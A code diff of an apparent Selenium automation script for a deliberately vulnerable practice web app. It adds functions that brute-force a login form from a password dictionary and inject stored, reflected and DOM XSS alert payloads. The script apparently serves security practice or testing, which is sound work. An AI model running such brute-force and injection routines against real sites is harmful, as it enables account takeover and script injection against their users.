@@ -159,18 +159,19 @@ def COMSI_HIGH_LEVEL(browser):
         sendInfoReturn(elem, comiStatementGenerator(3)) 
     else:
         sendInfoReturn(elem, COMSI_ATTACK_DEFAULT) 
-        
+
+#BRUTE FORCE ATTACK        
 def BRUTE_FORCE_ATTACK(browser, passFail, sleepTime):
     if RANDOM_START_BRUTE_FORCE and passFail:
-        i = random.randint(50, 98)
+        i = random.randint(RIPSE[0], RIPSE[2])
     elif RANDOM_START_BRUTE_FORCE and not passFail:
-        i = random.randint(95, 98)
+        i = random.randint(RIPSE[1], RIPSE[2])
     else:
         i = 0;
     if passFail: 
         maxI = len(PassDic);
     else:
-        maxI = 98
+        maxI = RIPSE[2]
     Found = False
     while  Found == False and i<maxI:
         time.sleep(sleepTime)
@@ -180,12 +181,67 @@ def BRUTE_FORCE_ATTACK(browser, passFail, sleepTime):
         sendInfoReturn(elem, PassCracker(i, PassDic))
         if elemPresenceCheck_XPATH(browser, BRUTE_FORCE_PASS_XPATH) != False:
             Found = True
-            print('Password is found, it is -  ' + PassCracker(i-1, PassDic))
+            print( PASSWORD_FOUND_TEXT + PassCracker(i-1, PassDic))
         else:
             i = i + 1;
     if i==maxI and Found == False:
-        print('Password not found')
+        print(PASSWORD_NOT_FOUND_TEXT)
             
-    
-    
-    
+#XSS STORED ATTACK
+def XSS_STORED_ATTACK(browser, LEVEL):
+    waitForLoad(browser,XSS_STORED_NAME_BOX_ID,  0)
+    elem = getElem(browser,XSS_STORED_NAME_BOX_ID,  0)
+    executeBrowserScript(BROWSER_SCRIPT_NAME_LENGTH_EXTEND,browser, elem)
+    if LEVEL == 0:
+        sendInfo(elem, TEXT_AREA_TEXT)
+        elem = getElem(browser,XSS_STORED_TEXT_AREA,  1)
+        sendInfoReturn(elem, SEND_ALERT_SIGNAL[LEVEL]); 
+    else:
+        sendInfo(elem, SEND_ALERT_SIGNAL[LEVEL])
+        elem = getElem(browser,XSS_STORED_TEXT_AREA,  1)
+        sendInfoReturn(elem, TEXT_AREA_TEXT); 
+    elem = getElem(browser, XSS_BUTTON_SIGNED_ID, 0)
+    elem.click()
+
+def XSS_CATCH_CLEAR_BOOK(browser):
+     try:
+         alert = browser.switch_to.alert
+         alert.accept()
+         waitForLoad(browser, XSS_BUTTON_CLEAR_ID, 0)
+         elem = getElem(browser, XSS_BUTTON_CLEAR_ID, 0)
+         elem.click()
+         alert = browser.switch_to.alert
+         alert.accept()
+     except:
+        print(CLEAR_DATA_BOOK_ERROR)
+
+def XSS_CLEAR_BOOK(browser):
+     try:
+         waitForLoad(browser, XSS_BUTTON_CLEAR_ID, 0)
+         elem = getElem(browser, XSS_BUTTON_CLEAR_ID, 0)
+         elem.click()
+         alert = browser.switch_to.alert
+         alert.accept()
+     except:
+        print(CLEAR_DATA_BOOK_ERROR)
+        
+#XSS REFLECTED ATTACK
+def XSS_REFLECTED_ATTACK(browser, LEVEL):
+    elem = getElem(browser,XSS_REFLECTED_NAME_BOX_ID,  0)
+    sendInfo(elem, SEND_ALERT_SIGNAL[LEVEL])
+    elem = getElem(browser, XSS_REFLECTED_SUBMIT_BUTTON, 1)
+    elem.click()
+
+def XSS_CATCH(browser):
+    try:
+         alert = browser.switch_to.alert
+         alert.accept()
+    except:
+        print(CATCH_DATA_ERROR)
+
+#XSS DOM ATTACK
+def XSS_DOM_ATTACK(browser, LEVEL):
+    current_url = browser.current_url  
+    new_url = current_url + XSS_DOM_LANGUAGE_URL + SEND_ALERT_SIGNAL_URL[LEVEL]
+    browser.get(new_url)
+
